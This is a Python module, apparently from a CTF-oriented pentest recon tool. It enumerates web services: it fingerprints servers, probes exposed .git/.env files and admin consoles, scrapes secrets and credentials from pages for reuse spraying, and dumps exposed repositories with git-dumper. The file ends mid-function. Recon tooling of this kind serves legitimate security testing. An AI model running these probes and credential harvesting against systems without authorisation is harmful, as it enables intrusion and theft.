import base64
import json
import re
import subprocess
from pathlib import Path
from urllib.parse import unquote, urljoin, urlparse

from lib.findings import FindingsSink as Findings
from lib.hosts import HostsManager
from lib.models import Discovery, Service
from lib.runner import Runner
from lib.scope import Scope
from lib.wordlists import Breadth, web_wordlist

# ffuf tuning — conservative for CTF targets
_FFUF_THREADS  = 20       # lower than before to avoid tripping rate limits / crashing services
_FFUF_TIMEOUT  = "180"    # seconds total per ffuf run (3 min is enough for common.txt at 20 threads)
_REQ_TIMEOUT   = "10"     # per-request timeout

# Crawl (gospider) wall-clock ceiling. Kept short: on a single-page box gospider
# can otherwise sit idle to its full timeout and bottleneck the action. The crawl
# runs LAST, so this cap never delays the dir/vhost busting above it.
_CRAWL_TIMEOUT = 45

# whatweb plugins worth recording as structured web-tech facts (name+version).
# Kept to a high-signal whitelist so the fact store gets "JQuery 1.4.4" /
# "HTTPServer HttpFileServer 2.3", not every cosmetic plugin whatweb prints.
_WHATWEB_TECH = {
    "httpserver", "jquery", "x-powered-by", "php", "apache", "nginx",
    "microsoft-iis", "iis", "openssl", "bootstrap", "wordpress", "joomla",
    "drupal", "tomcat", "coyote", "jenkins", "asp.net", "frontpage", "java",
    "nodejs", "express", "laravel", "django", "phpmyadmin", "modsecurity",
}

# whatweb token: Name[value]  →  capture name + bracketed value
_WHATWEB_RE = re.compile(r"([A-Za-z][\w.\-]*)\[([^\]]+)\]")

# ANSI escape sequence pattern
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mKGHFABCDJsu]")

# ffuf result line: "path    [Status: 200, Size: 1234, ...]"
_FFUF_RE = re.compile(r"^(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+).*?\]", re.MULTILINE)

# Patterns that look like secrets embedded in JS source
_JS_SECRET_RE = re.compile(
    r'(?:api[_-]?key|apikey|api[_-]?secret|client[_-]?secret|access[_-]?token|'
    r'auth[_-]?token|secret[_-]?key|private[_-]?key|password|passwd|bearer|jwt|'
    r'x-api-key|Authorization)\s*[=:]\s*["\']([^"\']{8,80})["\']',
    re.IGNORECASE,
)

# Paths that indicate sensitive content if they return 200
_SENSITIVE_PATHS = [
    ("/.git/HEAD",             ".git exposed (use git-dumper)"),
    ("/.git/config",           ".git/config exposed"),
    ("/.env",                  ".env file exposed"),
    ("/.htpasswd",             ".htpasswd exposed"),
    ("/web.config",            "web.config exposed"),
    ("/phpinfo.php",           "phpinfo.php exposed"),
    ("/server-status",         "Apache server-status enabled"),
    ("/.svn/entries",          "SVN repository exposed"),
    ("/WEB-INF/web.xml",       "WEB-INF/web.xml exposed"),
    ("/.DS_Store",             ".DS_Store exposed"),
    ("/crossdomain.xml",       "crossdomain.xml (Flash policy)"),
    ("/clientaccesspolicy.xml","clientaccesspolicy.xml (Silverlight policy)"),
    ("/backup.zip",            "backup.zip exposed"),
    ("/backup.tar.gz",         "backup.tar.gz exposed"),
    ("/.git/COMMIT_EDITMSG",   ".git/COMMIT_EDITMSG exposed"),
]

# ADCS web enrollment endpoints
_ADCS_PATHS = [
    "/certsrv",
    "/certsrv/certnew.asp",
    "/certenroll",
    "/certsrv/mscep/mscep.dll",
    "/ADPolicyProvider_CEP_UsernamePassword/service.svc",
]

# Jenkins paths — 200/403 means Jenkins is running
_JENKINS_PATHS = [
    ("/manage",         "Management interface"),
    ("/script",         "Script console (RCE if 200)"),
    ("/asynchPeople/",  "User list"),
    ("/systemInfo",     "System info"),
    ("/api/json",       "REST API"),
]

# Tomcat manager paths
_TOMCAT_PATHS = [
    ("/manager/html",         "Tomcat Manager"),
    ("/manager/text",         "Tomcat Manager (text)"),
    ("/host-manager/html",    "Tomcat Host Manager"),
]

# phpMyAdmin paths
_PMA_PATHS = [
    "/phpmyadmin", "/pma", "/phpMyAdmin", "/dbadmin", "/db/phpmyadmin",
    "/admin/phpmyadmin", "/mysql", "/phpma",
]

# Adobe ColdFusion (JRun) admin + traversal-relevant paths. Presence of the
# CFIDE admin (default on 8500, but often reverse-proxied onto 80/443) is the
# tell for CVE-2010-2861 — an unauthenticated directory traversal that leaks the
# admin password hash from password.properties.
_COLDFUSION_PATHS = [
    ("/CFIDE/administrator/enter.cfm",                 "ColdFusion administrator login"),
    ("/CFIDE/administrator/index.cfm",                 "ColdFusion administrator console"),
    ("/CFIDE/adminapi/administrator.cfc?method=login", "ColdFusion admin API"),
    ("/CFIDE/wizards/common/_logintowizard.cfm",       "ColdFusion wizard (CVE-2010-2861 sink)"),
]

# Splunk login paths
_SPLUNK_PATHS = [
    "/en-US/account/login",
    "/en-GB/account/login",
]

# GraphQL endpoint paths
_GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/graphiql",
    "/playground", "/api/v1/graphql", "/api/v2/graphql",
]

# Spring Boot Actuator endpoints. The base index plus the high-value leaks:
# /env + /configprops often hold secrets; /sessions maps live JSESSIONIDs to
# usernames (direct session-hijack foothold — CozyHosting); /heapdump/mappings
# expand the surface. (label, sensitive?) — sensitive ones get a stronger note.
_SPRING_ACTUATOR_PATHS = [
    ("/actuator",          False),
    ("/actuator/health",   False),
    ("/actuator/info",     False),
    ("/actuator/mappings", False),
    ("/actuator/sessions", True),
    ("/actuator/env",      True),
    ("/actuator/configprops", True),
    ("/actuator/heapdump", True),
    ("/actuator/beans",    False),
    # Spring Boot 1.x served these at the root (no /actuator prefix).
    ("/env",      True),
    ("/mappings", False),
    ("/trace",    True),
]

# Substrings that mark a Spring Boot app — Whitelabel Error Page (default error
# view) and Spring Security's login form. Lowercased before match.
_SPRING_MARKERS = (
    "whitelabel error page",
    "org.springframework",
    "spring-security",
    "_csrf",  # Spring Security login form hidden field
)

# Security header flags for assessment
_SEC_HEADERS = {
    "strict-transport-security": "HSTS",
    "x-frame-options":           "X-Frame-Options",
    "content-security-policy":   "CSP",
    "x-content-type-options":    "X-Content-Type-Options",
    "permissions-policy":        "Permissions-Policy",
}


def enumerate_web(
    ip: str,
    service: Service,
    domain: str | None,
    runner: Runner,
    findings: Findings,
    scope: Scope,
    hosts: HostsManager,
    available: set[str],
    is_followup: bool = False,
    deep: bool = False,
    breadth: Breadth = Breadth.STANDARD,
    host_header: str | None = None,
) -> list[Discovery]:
    """
    Web enumeration for one port/hostname.

    Fast mode (default): fingerprint → sensitive files → targeted app probes →
    single dir bust → vhost bust → crawl.

    Deep mode (--deep): additionally runs cewl+dir bust, arjun param discovery,
    and the full API endpoint scanner.

    `breadth` scales the dir/vhost/API wordlists (concise→broad); BROAD wordlists
    take far longer but leave no stone unturned.

    `host_header` targets a vhost that has no DNS/etc-hosts entry: requests go to
    the IP but carry `Host: <host_header>` so the named vhost is served. Set
    automatically by the redirect follow-up below.
    """
    port = service.port
    scheme = service.scheme
    hostname = service.hostname or (domain if domain and not is_followup else ip)
    # With a Host header we must address the server by IP (the vhost name doesn't
    # resolve); the header carries the vhost identity instead.
    base_url = _build_url(scheme, ip if host_header else hostname, port)

    tag = f"TCP {port} — {scheme.upper()}"
    if host_header:
        tag += f" (vhost {host_header} via Host header)"
    elif hostname != ip:
        tag += f" ({hostname})"
    findings.h3(tag)
    print(f"[*] Web — {base_url}" + (f"  [Host: {host_header}]" if host_header else "")
          + ("  [deep]" if deep else ""))

    discoveries: list[Discovery] = []

    # ── 1. Headers + tech fingerprint ─────────────────────────────────────────
    print(f"    → fingerprint")
    fp = _fingerprint(base_url, port, runner, findings, available, host_header)

    # Detect catch-all redirect routing (vhost-only servers 30x every path to their
    # vhost name). When present, signature probes and the dir bust filter the blanket
    # redirect so they don't report a false hit on every path.
    catchall = _catchall_redirect(base_url, host_header)
    if catchall:
        findings.note(
            f"Catch-all redirect detected — every path returns HTTP {catchall[0]} → "
            f"`{catchall[1]}`. Signature probes and the dir bust filter it; the real "
            f"content surface is the vhost, not this host."
        )

    # ── 2. NTLM info disclosure — only probe IIS/Windows endpoints (saves ~10s/port on Linux) ──
    _check_ntlm_info(ip, port, runner, findings, server_hint=fp.get("server", ""))

    # Microsoft-HTTPAPI: WinRM/RPC-over-HTTP — no web content to enumerate
    if "microsoft-httpapi" in fp["server"].lower():
        findings.note(
            f"Microsoft-HTTPAPI endpoint — no web content to enumerate. "
            f"WinRM: `evil-winrm -i {ip} -u USER -p PASS`"
        )
        return discoveries

    # ── 3. HTTP method probe ───────────────────────────────────────────────────
    _check_http_methods(base_url, runner, findings, host_header)

    # ── 4. CORS misconfiguration check ────────────────────────────────────────
    _check_cors(base_url, runner, findings)

    # ── 4b. Forms + XSS-to-privilege tells (landing page) ─────────────────────
    _check_forms(base_url, runner, findings, host_header)

    # ── 5. Redirect detection (IP → domain) ───────────────────────────────────
    if not is_followup:
        redirect_host = _detect_redirect(ip, port, scheme)
        if redirect_host and redirect_host != ip and not scope.check(redirect_host):
            # The redirect is served BY the in-scope IP, so the vhost name is the
            # same host — adopt it into scope (tight: only the IP's own target).
            scope.adopt(redirect_host)
        if redirect_host and redirect_host != ip and scope.check(redirect_host):
            findings.bullet(f"**Redirect:** `{_build_url(scheme, ip, port)}` → `{redirect_host}`")
            discoveries.append(Discovery(
                type="redirect", hostname=redirect_host,
                port=port, scheme=scheme, source=f"HTTP redirect on port {port}",
            ))
            # Back-half: promote the redirect target to a domain/vhost fact and
            # follow it. If it resolves (DNS) or we can add it to /etc/hosts, hit
            # it by name; otherwise re-enumerate by IP carrying a Host header.
            _promote_vhost(runner, redirect_host)
            resolves = hosts.resolves(redirect_host) or hosts.add_silent(ip, redirect_host)
            follow_hdr = None if resolves else redirect_host
            findings.note(f"Following redirect vhost `{redirect_host}` "
                          + ("(resolves / added to hosts)" if resolves
                             else "via Host header (no DNS/sudo)"))
            vhost_svc = Service(port=port, proto="tcp", name=service.name,
                                version=service.version, is_web=True,
                                scheme=scheme, hostname=redirect_host)
            discoveries += enumerate_web(
                ip, vhost_svc, domain, runner, findings, scope, hosts, available,
                is_followup=True, deep=deep, breadth=breadth, host_header=follow_hdr,
            )

    # ── 6. robots.txt ─────────────────────────────────────────────────────────
    _fetch_robots(base_url, runner, findings, host_header)

    # ── 7. Sensitive file probes ───────────────────────────────────────────────
    _check_sensitive_files(base_url, runner, findings, available, host_header)

    # ── 8. SSL cert — extract CN / SANs ───────────────────────────────────────
    if scheme == "https":
        ssl_names = _extract_ssl_names(ip, port, runner, findings)
        for name in ssl_names:
            if name != hostname and scope.check(name):
                discoveries.append(Discovery(
                    type="ssl_san", hostname=name,
                    port=port, scheme="https", source=f"SSL certificate on port {port}",
                ))

    # ── 9. testssl.sh ─────────────────────────────────────────────────────────
    if scheme == "https" and "testssl.sh" in available:
        _run_testssl(ip, port, runner, findings)

    # ── 10. ADCS probe ────────────────────────────────────────────────────────
    _check_adcs(base_url, ip, runner, findings, host_header, catchall)

    # ── 11. Next.js ───────────────────────────────────────────────────────────
    if fp.get("is_nextjs"):
        print(f"    → Next.js enumeration")
        _check_nextjs(base_url, runner, findings)

    # ── 12. WordPress ─────────────────────────────────────────────────────────
    if "wpscan" in available:
        _wpscan(base_url, runner, findings)

    # ── 13. CMS detection — Joomla + Drupal ───────────────────────────────────
    _check_cms(base_url, runner, findings, available, host_header, catchall)

    # ── 14. Jenkins ───────────────────────────────────────────────────────────
    _check_jenkins(base_url, runner, findings)

    # ── 15. Tomcat manager ────────────────────────────────────────────────────
    _check_tomcat(base_url, ip, runner, findings, host_header, catchall)

    # ── 16. phpMyAdmin ────────────────────────────────────────────────────────
    _check_phpmyadmin(base_url, runner, findings, host_header, catchall)

    # ── 17. Splunk ────────────────────────────────────────────────────────────
    _check_splunk(base_url, runner, findings, host_header, catchall)

    # ── 18. GraphQL ───────────────────────────────────────────────────────────
    _check_graphql(base_url, runner, findings)

    # ── 18b. Spring Boot Actuator (only when the app fingerprints as Spring) ───
    _check_spring_actuator(base_url, fp, runner, findings, host_header, catchall)

    # ── 18c. Adobe ColdFusion (JRun) admin ────────────────────────────────────
    _check_coldfusion(base_url, fp, runner, findings, host_header, catchall)

    # ── 19. Directory bust ────────────────────────────────────────────────────
    if "ffuf" in available:
        print(f"    → dir bust")
        _dir_bust(base_url, runner, findings, fp, breadth, host_header, catchall)

    # ── 20. API endpoint discovery (deep only) ────────────────────────────────
    if deep and "ffuf" in available:
        print(f"    → API bust (deep)")
        _api_bust(base_url, runner, findings, breadth)

    # ── 21. cewl + targeted dir bust (deep only) ──────────────────────────────
    if deep and "cewl" in available and "ffuf" in available:
        print(f"    → cewl wordlist (deep)")
        cewl_wl = _run_cewl(base_url, runner, findings)
        if cewl_wl:
            _dir_bust_cewl(base_url, cewl_wl, runner, findings, fp)

    # ── 22. Parameter discovery (deep only) ───────────────────────────────────
    if deep and "arjun" in available:
        _param_fuzz(base_url, runner, findings)

    # ── 23. Vhost bust ────────────────────────────────────────────────────────
    if not is_followup and domain and "ffuf" in available:
        print(f"    → vhost bust")
        vhosts = _vhost_bust(ip, port, scheme, domain, runner, findings, breadth)
        for vh in vhosts:
            if scope.check(vh):
                discoveries.append(Discovery(
                    type="vhost", hostname=vh,
                    port=port, scheme=scheme, source=f"ffuf vhost bust port {port}",
                ))

    # ── 24. Crawl ─────────────────────────────────────────────────────────────
    if "gospider" in available:
        print(f"    → crawl")
        _crawl(base_url, scope, runner, findings, host_header)

    return discoveries


def _promote_vhost(runner: Runner, hostname: str) -> None:
    """Promote a discovered vhost/redirect target to domain + hostname facts so
    vhost busting and domain-keyed (AD/kerberos) actions unlock. No-op off-engine."""
    ws = getattr(runner, "ws", None)
    name = (hostname or "").strip().lower()
    if ws is None or not name:
        return
    add_host = getattr(ws, "add_hostname", None)
    if add_host:
        add_host(name)
    set_dom = getattr(ws, "set_discovered_domain", None)
    # Promote an FQDN to the domain fact (e.g. blocky.htb). A bare label isn't a
    # domain, so only promote when it looks like an FQDN.
    if set_dom and "." in name:
        set_dom(name)


# ── Fingerprint ───────────────────────────────────────────────────────────────

def _record_web_tech(runner: Runner, port: int, techs) -> None:
    """Push detected web tech/version strings into the fact store when the runner
    is engine-wired (runner.ws is a FactStore). A no-op in legacy/headless paths
    whose workspace has no add_web_tech, so web.py stays UI-independent."""
    ws = getattr(runner, "ws", None)
    add = getattr(ws, "add_web_tech", None)
    if add is None:
        return
    for t in techs:
        if t and t.strip():
            add(port, t.strip())


def _record_user(runner: Runner, username: str) -> None:
    """Push a discovered username into the fact store when the runner is
    engine-wired (runner.ws is a FactStore). A no-op in legacy/headless paths,
    so web.py stays UI-independent. Feeds the cross-protocol reuse spray."""
    ws = getattr(runner, "ws", None)
    add = getattr(ws, "add_user", None)
    name = (username or "").strip()
    if add is None or not name:
        return
    add(name)


def _record_cred(runner: Runner, text: str) -> None:
    """Push a credential literal scraped from an artifact into the fact store
    (runner.ws.add_cred) so the cross-protocol reuse spray tests it. No-op off-engine."""
    ws = getattr(runner, "ws", None)
    add = getattr(ws, "add_cred", None)
    text = (text or "").strip()
    if add is None or not text:
        return
    add(text)


def _whatweb_tech(clean: str) -> list[str]:
    """Pull high-signal Name[value] tokens out of cleaned whatweb output, e.g.
    'JQuery[1.4.4]' → 'JQuery 1.4.4'. Whitelisted by plugin name to stay signal."""
    out: list[str] = []
    for name, val in _WHATWEB_RE.findall(clean):
        if name.lower() in _WHATWEB_TECH:
            out.append(f"{name} {val.strip()}")
    return list(dict.fromkeys(out))


def _fingerprint(url: str, port: int, runner: Runner, findings: Findings,
                 available: set[str], host_header: str | None = None) -> dict:
    findings.h4("Fingerprint")

    cmd = ["curl", "-sS", "-k", "-I", "-L", "--max-time", "15"] + _hh(host_header) + [url]
    out = runner.run(cmd, f"web_{_label(url)}_headers")
    findings.cmd(" ".join(cmd))
    _parse_interesting_headers(out, findings)

    meta = _parse_headers_meta(out)

    # Structured fingerprint: Server / X-Powered-By headers → web-tech facts.
    _record_web_tech(runner, port, [meta.get("server"), meta.get("powered_by")])

    # Skip whatweb on HTTPAPI — it always times out on WinRM/RPC endpoints
    if "whatweb" in available and "microsoft-httpapi" not in meta["server"].lower():
        cmd2 = ["whatweb", "--no-errors", "-a", "3"] \
            + (["--header", f"Host: {host_header}"] if host_header else []) + [url]
        out2 = runner.run(cmd2, f"web_{_label(url)}_whatweb", timeout=60)
        findings.cmd(" ".join(cmd2))
        clean = _ANSI_RE.sub("", out2).strip()
        if clean:
            findings.code_block(clean)
            techs = _whatweb_tech(clean)
            if techs:
                findings.bullet(f"**Tech:** {', '.join(f'`{t}`' for t in techs)}")
                _record_web_tech(runner, port, techs)

    return meta


def _parse_headers_meta(raw: str) -> dict:
    meta = {"status": "", "server": "", "powered_by": "", "is_nextjs": False, "is_php": False}
    for line in raw.splitlines():
        if line.startswith("HTTP/"):
            parts = line.split()
            if len(parts) >= 2:
                meta["status"] = parts[1]
        elif ":" in line:
            key, _, val = line.partition(":")
            k = key.strip().lower()
            v = val.strip()
            if k == "server":
                meta["server"] = v
            elif k == "x-powered-by":
                meta["powered_by"] = v
                if "next.js" in v.lower():
                    meta["is_nextjs"] = True
                if "php" in v.lower():
                    meta["is_php"] = True
            elif k.startswith("x-nextjs"):
                meta["is_nextjs"] = True
    return meta


def _parse_interesting_headers(raw: str, findings: Findings):
    interesting = {
        "server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
        "location", "set-cookie", "www-authenticate", "content-security-policy",
        "x-frame-options", "access-control-allow-origin",
    }
    seen_sec: set[str] = set()
    for line in raw.splitlines():
        if ":" in line:
            key = line.split(":", 1)[0].strip().lower()
            if key in interesting:
                findings.bullet(f"`{line.strip()}`")
            if key in _SEC_HEADERS:
                seen_sec.add(key)
            # Flag insecure cookie attributes
            if key == "set-cookie":
                val = line.lower()
                issues = []
                if "httponly" not in val:
                    issues.append("missing HttpOnly")
                if "secure" not in val:
                    issues.append("missing Secure")
                if "samesite" not in val:
                    issues.append("missing SameSite")
                if issues:
                    findings.note(f"Cookie flags: {', '.join(issues)} — `{line.strip()}`")
                # A client-readable role/privilege cookie is the classic
                # XSS/tamper → privilege tell (Headless: a non-HttpOnly is_admin
                # cookie whose value base64-decoded to "user").
                tell = _cookie_role_tell(line.strip())
                if tell:
                    if "httponly" not in val:
                        tell += " **and is JS-readable (no HttpOnly)** — strong XSS/tamper→privilege tell"
                    findings.note(f"Privilege tell: {tell}")

    # Report missing security headers (HTTPS context implied if any are present)
    missing = [label for hdr, label in _SEC_HEADERS.items() if hdr not in seen_sec]
    if missing and "HTTP/" in raw:
        findings.note(f"Missing security headers: {', '.join(missing)}")


# ── XSS-to-privilege recon tells (cookies + forms) ────────────────────────────
# p0rtix never exploits XSS, but a few passive signals flag a box whose shape is
# "user input rendered to an admin → cookie theft → privilege" (Headless): a
# client-readable role cookie, and free-text/contact forms that feed such a page.

# Short role/privilege tokens a tamperable cookie value can carry.
_ROLE_TOKENS = ("administrator", "admin", "moderator", "superuser", "root",
                "guest", "user", "operator")
# Cookie-name fragments that suggest a client-side role/privilege flag.
_ROLE_NAME_HINTS = ("admin", "role", "priv", "level", "isadmin", "is_admin", "usertype")


def _cookie_decode_variants(value: str) -> list[str]:
    """Plausible plaintexts for a cookie value: raw, URL-decoded, base64-decoded
    (std + urlsafe). Lets a base64'd role flag (Headless's is_admin) be read."""
    out = [value]
    try:
        dec = unquote(value)
        if dec != value:
            out.append(dec)
    except Exception:
        pass
    s = value.strip()
    if len(s) >= 4 and re.fullmatch(r"[A-Za-z0-9+/_=-]+", s):
        padded = s.replace("-", "+").replace("_", "/")
        padded += "=" * (-len(padded) % 4)
        for fn in (base64.b64decode, base64.urlsafe_b64decode):
            try:
                txt = fn(s + "=" * (-len(s) % 4) if fn is base64.urlsafe_b64decode
                        else padded).decode("utf-8", "strict")
                if txt.isprintable():
                    out.append(txt)
            except Exception:
                pass
    return out


def _cookie_role_tell(cookie_line: str) -> str | None:
    """Return a short note when a Set-Cookie carries a role/privilege value (raw or
    base64/URL-decoded) or has a role-ish name. None for ordinary session cookies.
    Long values (JWT/session blobs) are skipped to keep the signal high."""
    after = cookie_line.split(":", 1)[1] if ":" in cookie_line else cookie_line
    name, _, value = after.split(";", 1)[0].strip().partition("=")
    name_l, value = name.strip().lower(), value.strip()
    if not value:
        return None
    for variant in _cookie_decode_variants(value):
        v = variant.strip().strip('"\'')
        if not v or len(v) > 24:           # skip session/JWT blobs — not a role flag
            continue
        vl = v.lower()
        if any(re.search(rf"\b{re.escape(tok)}\b", vl) for tok in _ROLE_TOKENS):
            dec = "" if v == value.strip('"\'') else f" → decodes to `{v}`"
            return f"cookie `{name.strip()}={value[:24]}` carries a role value{dec}"
    name_role = any(h in name_l for h in _ROLE_NAME_HINTS)
    if name_role:
        return (f"cookie name `{name.strip()}` looks like a client-side "
                f"role/privilege flag (value `{value[:24]}`)")
    return None


# Form field types/names that take attacker-controlled free text — the stored/
# reflected-XSS sinks worth a manual look.
_FREETEXT_INPUT_RE = re.compile(
    r'type\s*=\s*["\']?(?:text|search|url|email|textarea)', re.IGNORECASE)
_SINK_NAME_RE = re.compile(
    r'(?:comment|message|feedback|contact|support|review|body|content|search|note|subject)',
    re.IGNORECASE)


def _check_forms(base_url: str, runner: Runner, findings: Findings,
                 host_header: str | None = None) -> None:
    """Note HTML forms on the landing page — input vectors worth manual review.
    A free-text/contact form plus a client-readable role cookie is the classic
    blind/stored-XSS-to-privilege shape (Headless's /support form). Recon only:
    p0rtix flags the surface, it never submits a payload."""
    cmd = ["curl", "-sk", "--max-time", "12"] + _hh(host_header) + [base_url]
    html = runner.run(cmd, f"web_{_label(base_url)}_forms")
    forms = list(re.finditer(r"<form\b([^>]*)>(.*?)</form>",
                             html or "", re.IGNORECASE | re.DOTALL))
    if not forms:
        return
    findings.h4("Forms")
    for m in forms:
        attrs, body = m.group(1), m.group(2)
        method = (re.search(r'method\s*=\s*["\']?([a-zA-Z]+)', attrs) or [None, "GET"])[1].upper()
        action = (re.search(r'action\s*=\s*["\']([^"\']*)', attrs) or [None, ""])[1] or "(self)"
        inputs = re.findall(r'name\s*=\s*["\']([^"\']+)', attrs + body)
        has_pw = bool(re.search(r'type\s*=\s*["\']?password', body, re.IGNORECASE))
        has_freetext = bool(_FREETEXT_INPUT_RE.search(body) or "<textarea" in body.lower())
        kind = "login form" if has_pw else "form"
        line = f"{method} `{action}` — {kind}"
        if inputs:
            line += f" (fields: {', '.join(f'`{n}`' for n in inputs[:8])})"
        findings.bullet(line)
        if has_freetext or _SINK_NAME_RE.search(attrs + body):
            findings.note(
                f"Free-text/contact form at `{action}` — possible stored/blind-XSS "
                "sink. If submissions are reviewed by staff (look for a "
                "'hacking attempt'/sanitisation rejection), header/field input may "
                "render unescaped on an admin page (XSS→cookie theft). Manual review.")


# ── NTLM info disclosure ──────────────────────────────────────────────────────

def _check_ntlm_info(ip: str, port: int, runner: Runner, findings: Findings,
                     server_hint: str = ""):
    """
    nmap http-ntlm-info — leaks NetBIOS name, DNS domain, product version.
    Only probes IIS/Windows endpoints — skip on nginx/Apache/etc to save ~10s per port.
    """
    _windows_markers = ("iis", "microsoft", "asp", "httpapi", "windows", "iisexpress")
    if not any(m in server_hint.lower() for m in _windows_markers):
        return

    cmd = ["nmap", "--script", "http-ntlm-info", "-p", str(port), ip]
    out = runner.run(cmd, f"web_{ip}_{port}_ntlm_info", timeout=30)
    ntlm_fields = ("NetBIOS_Computer_Name", "NetBIOS_Domain_Name",
                   "DNS_Computer_Name", "DNS_Domain_Name", "Product_Version")
    hits = [l.strip() for l in out.splitlines()
            if any(f in l for f in ntlm_fields)]
    if hits:
        findings.h4("NTLM Info Disclosure")
        findings.cmd(" ".join(cmd))
        for line in hits:
            findings.bullet(f"`{line}`")


# ── HTTP method probe ─────────────────────────────────────────────────────────

def _check_http_methods(url: str, runner: Runner, findings: Findings,
                        host_header: str | None = None):
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS", "-I"] + _hh(host_header) + [url],
        capture_output=True, text=True,
    )
    for line in result.stdout.splitlines():
        key = line.split(":", 1)[0].strip().lower()
        if key in ("allow", "access-control-allow-methods", "public"):
            methods = line.split(":", 1)[1].strip()
            dangerous = [m for m in ("PUT", "DELETE", "TRACE", "PATCH", "CONNECT")
                         if m in methods.upper()]
            if dangerous:
                findings.bullet(f"**Dangerous HTTP methods allowed:** `{', '.join(dangerous)}` (from `{methods}`)")
            else:
                findings.bullet(f"HTTP methods: `{methods}`")
            return


# ── Redirect detection ────────────────────────────────────────────────────────

def _catchall_redirect(base_url: str, host_header: str | None = None) -> tuple[str, str] | None:
    """Detect catch-all redirect routing: probe a path that cannot exist and see if
    the server still answers with a redirect. Vhost-only servers (e.g. nginx that
    302s the bare IP to its vhost name) redirect *every* path, so every signature
    probe and dir-bust line would otherwise be a false hit. Returns
    (status, redirect_url) of the blanket redirect, else None."""
    r = subprocess.run(
        ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
         "-w", "%{http_code} %{redirect_url}"] + _hh(host_header)
        + [f"{base_url}/p0rtix-noexist-7f3a2c"],
        capture_output=True, text=True,
    )
    parts = r.stdout.strip().split()
    if len(parts) >= 2 and parts[0] in ("301", "302", "303", "307", "308") and parts[1]:
        return parts[0], parts[1]
    return None


def _probe_code(url: str, host_header: str | None = None,
                catchall: tuple[str, str] | None = None) -> str | None:
    """HTTP status for one signature probe. Returns None when the response is just
    the host's catch-all redirect (matched against `catchall` from
    _catchall_redirect), so detectors don't fire on vhost-only routing."""
    r = subprocess.run(
        ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
         "-w", "%{http_code} %{redirect_url}"] + _hh(host_header) + [url],
        capture_output=True, text=True,
    )
    parts = r.stdout.strip().split()
    if not parts:
        return None
    code = parts[0]
    loc = parts[1] if len(parts) > 1 else ""
    if catchall and code in ("301", "302", "303", "307", "308") and loc == catchall[1]:
        return None
    return code


def _detect_redirect(ip: str, port: int, scheme: str) -> str | None:
    url = _build_url(scheme, ip, port)
    result = subprocess.run(
        ["curl", "-sS", "-k", "-L", "--max-time", "15",
         "-o", "/dev/null", "-w", "%{url_effective}", url],
        capture_output=True, text=True,
    )
    effective = result.stdout.strip()
    if not effective:
        return None
    host = urlparse(effective).hostname or ""
    return host if host != ip else None


# ── robots.txt ────────────────────────────────────────────────────────────────

def _fetch_robots(base_url: str, runner: Runner, findings: Findings,
                  host_header: str | None = None):
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-o", "/dev/null",
         "-w", "%{http_code}"] + _hh(host_header) + [f"{base_url}/robots.txt"],
        capture_output=True, text=True,
    )
    if result.stdout.strip() not in ("200", "301", "302"):
        return

    cmd = ["curl", "-sS", "-k", "--max-time", "10"] + _hh(host_header) + [f"{base_url}/robots.txt"]
    out = runner.run(cmd, f"web_{_label(base_url)}_robots")
    if out.strip():
        findings.h4("robots.txt")
        findings.cmd(" ".join(cmd))
        findings.code_block(out.strip())


# ── Sensitive file probes ─────────────────────────────────────────────────────

def _check_sensitive_files(base_url: str, runner: Runner, findings: Findings,
                           available: set[str], host_header: str | None = None):
    found: list[tuple[str, str]] = []
    for path, label in _SENSITIVE_PATHS:
        result = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}"] + _hh(host_header) + [f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        if result.stdout.strip() == "200":
            found.append((path, label))

    if found:
        findings.h4("Sensitive Files")
        for path, label in found:
            findings.bullet(f"**{label}**: `{base_url}{path}`")
            findings.add_summary(f"**{label}** exposed at `{base_url}{path}`")
            if ".git/HEAD" in path and "git-dumper" in available:
                git_out_dir = str(runner.ws.loot_dir / f"git_dump_{_label(base_url)}")
                cmd = ["git-dumper", f"{base_url}/.git/", git_out_dir]
                findings.cmd(" ".join(cmd))
                runner.run(cmd, f"web_{_label(base_url)}_git_dumper", timeout=300)
                findings.bullet(f"  git-dumper output: `{git_out_dir}`")


# ── SSL certificate ───────────────────────────────────────────────────────────

def _extract_ssl_names(ip: str, port: int, runner: Runner, findings: Findings) -> list[str]:
    cmd = ["openssl", "s_client", "-connect", f"{ip}:{port}",
           "-servername", ip, "-showcerts"]
    out = runner.run(cmd, f"web_{ip}_{port}_ssl_cert", timeout=15)

    cert_pem = _extract_pem(out)
    if not cert_pem:
        return []

    result = subprocess.run(
        ["openssl", "x509", "-noout", "-text"],
        input=cert_pem, capture_output=True, text=True,
    )
    cert_text = result.stdout

    names: list[str] = []
    cn = re.search(r"Subject:.*?CN\s*=\s*([^\s,/]+)", cert_text)
    if cn:
        names.append(cn.group(1).lstrip("*."))
    for m in re.finditer(r"DNS:([^\s,]+)", cert_text):
        names.append(m.group(1).lstrip("*."))

    unique = list(dict.fromkeys(n for n in names if n))
    if unique:
        findings.h4("SSL Certificate")
        for n in unique:
            findings.bullet(f"CN/SAN: `{n}`")

    return unique


def _extract_pem(openssl_out: str) -> str:
    start = openssl_out.find("-----BEGIN CERTIFICATE-----")
    end = openssl_out.find("-----END CERTIFICATE-----")
    if start == -1 or end == -1:
        return ""
    return openssl_out[start: end + len("-----END CERTIFICATE-----")]


# ── testssl.sh ────────────────────────────────────────────────────────────────

def _run_testssl(ip: str, port: int, runner: Runner, findings: Findings):
    findings.h4("testssl.sh")
    # Resolve the real executable — Kali's package installs it as `testssl`.
    from lib.deps import resolve_bin
    cmd = [resolve_bin("testssl.sh"), "--color", "0", "--quiet", "--fast", f"{ip}:{port}"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{ip}_{port}_testssl", timeout=300)

    flag_keywords = (
        "VULNERABLE", "HIGH", "MEDIUM", "NOT ok", "WARN",
        "BEAST", "POODLE", "SWEET32", "CRIME", "BREACH",
        "DROWN", "LOGJAM", "FREAK", "LUCKY13",
    )
    hits = [l.strip() for l in out.splitlines()
            if any(kw in l for kw in flag_keywords) and l.strip()]
    if hits:
